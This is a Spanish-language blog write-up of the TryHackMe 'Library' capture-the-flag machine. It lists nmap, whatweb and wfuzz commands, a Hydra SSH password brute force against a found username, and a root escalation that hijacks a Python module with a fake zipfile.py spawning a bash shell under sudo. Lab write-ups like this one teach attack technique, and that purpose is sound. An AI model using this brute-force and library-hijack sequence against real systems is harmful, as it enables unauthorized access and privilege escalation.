---
layout: single
title: Library
excerpt: "boot2root machine for FIT and bsides guatemala CTF"
date: 2022-04-29
classes: wide
header:
  teaser: /assets/images/thm-writeup-library/library_logo.png
  teaser_home_page: true
  icon: /assets/images/thm_ico.png
categories:
  - TryHackMe
  - infosec
tags:
  - Security
  - Hydra
  - SSH
  - Python
  - nmap
  - wfuzz
---

![logo](/assets/images/thm-writeup-library/library_logo.png)

 [Link](https://tryhackme.com/room/bsidesgtlibrary "dav")

boot2root machine for FIT and bsides guatemala CTF - Read user.txt and root.txt.

---

## 1. Fase de reconocimiento

- Para  conocer a que nos estamos enfrentando lanzamos el siguiente comando:

~~~css
ping -c 1 {ip}
~~~

![ping](/assets/images/thm-writeup-library/library_ping.png)



- De acuerdo con el ttl=63 sabemos que nos estamos enfrentando a una máquina con sistema operativo Linux.

---

## 2. Enumeración / Escaneo

- Escaneo de la totalidad de los ***65535*** puertos de red el cual guardamos en un archivo en formato ***nmap*** con el siguiente comando:
  
~~~css
└─# nmap -p- -sS --min-rate 5000 --open -vvv -n -Pn {ip} -oN allports
~~~

![ping](/assets/images/thm-writeup-library/library_nmap_allports.png)

---

- De acuerdo con el escaneo anterior, se encuentran los siguientes puertos abiertos; 22 (ssh) y 80 (htp)

- Escaeno de vulnerabilidades sobre los puerto 80:
  
~~~css
└─#  nmap -v -A -sC -sV -Pn {ip} -p22,80 --script vuln

~~~

---

- Whatweb nos da la siguiente información:

~~~css
whatweb {ip}
~~~

![whatweb](/assets/images/thm-writeup-library/library_whatweb.png)

---

- Revisión de la URL ***http://10.10.158.155***:

![whatweb](/assets/images/thm-writeup-library/library_web.png)

- Buscando el la ruta ***robots.txt***, me encontré con el siguiente mensaje:

![robots](/assets/images/thm-writeup-library/library_robots.png)

---

## 3. WFUZ

- Escaeno de subdominios con wfuzz:

~~~css
└─# wfuzz --hc=404 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt {ip}/FUZZ/
~~~

![wfuzz](/assets/images/thm-writeup-library/library_wfuzz.png)

- Con el anterior escaner encotramos solo un archivo ***images*** en el cual no encotramos unas imagenes:

![wfuzz](/assets/images/thm-writeup-library/library_images.png)

---

## 4 Hydra

- Con la información de ***robots.txt*** procedemos a intentar por fuerza bruta a conseguir la contraseña del usuario ***meliodas*** que habiamos encontrado en la página de inicio:

~~~css
└─$ hydra -l meliodas -P /usr/share/wordlists/rockyou.txt   ssh://{ip} -f -VV -t 4
~~~

![Hydra](/assets/images/thm-writeup-library/library_hydra.png)


## 4. SSH

- Con la contraseña obtenida con ***hydra*** del usuario ***meliodas*** procedemos a establecer una conexión via ***ssh**.

~~~css
└─# ssh meliodas@{ip}
~~~

![ssh](/assets/images/thm-writeup-library/library_ssh.png)


## 5. Bandera de usuario

- Listamos con ***ls*** y encontramos el archivo ***user.txt***:

![usr](/assets/images/thm-writeup-library/library_usr.png)

---

## 6. Bandera root

- Búsqueda de vulnerabilidades con el comando ***sudo -l***:

![root](/assets/images/thm-writeup-library/library_ls.png)

- Creación del binario  ***zipfile.py***, desde la máquina atacante, con el siguiente contenido que nos va a escalar una ***bash*** como root:

~~~css
library_ls.pngimport os

ZIP_DEFLATED = 1

def ZipFile(param1, param2, param3):
        print(os.system('/bin/bash'))
~~~

- Procedemos a compartirlo con un servidor en ***python***

![root](/assets/images/thm-writeup-library/library_server.png)

---

- Descargamos el archivo creado en la máquina con ***wget***:

![wget](/assets/images/thm-writeup-library/library_wget.png)

---

- Ejecutamos el script ***bak.py*** y obtenemos la bandera root:

![root](/assets/images/thm-writeup-library/library_root.png)

---

## 7. Fuentes

- Writeup:
  
<https://r4bb1t.medium.com/library-write-up-7dd5d5c5a9eb>
